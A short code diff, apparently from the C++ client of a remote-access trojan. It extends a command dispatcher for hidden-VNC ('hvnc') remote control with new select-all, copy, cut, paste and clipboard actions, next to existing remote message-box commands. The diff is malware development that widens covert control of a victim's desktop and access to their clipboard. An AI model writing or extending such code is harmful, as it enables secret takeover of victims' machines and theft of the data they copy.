@@ -221,7 +221,9 @@ private:
             else if (action == "hvnc_start" || action == "hvnc_stop" || action == "hvnc_run" ||
 					action == "hvnc_quality" || action == "hvnc_mousedown" || action == "hvnc_mouseup" ||
 					action == "hvnc_mousemove" || action == "hvnc_keydown" || action == "hvnc_keyup" ||
-					action == "hvnc_char" || action == "hvnc_doubleclick") {   // ← bu iki eylem eklendi
+					action == "hvnc_char" || action == "hvnc_doubleclick" ||
+					action == "hvnc_selectall" || action == "hvnc_copy" || action == "hvnc_cut" ||
+					action == "hvnc_paste" || action == "hvnc_clipboard") {
 				execute_hvnc_command(data);
 			}
             else if (action == "message" || action == "messagebox") {
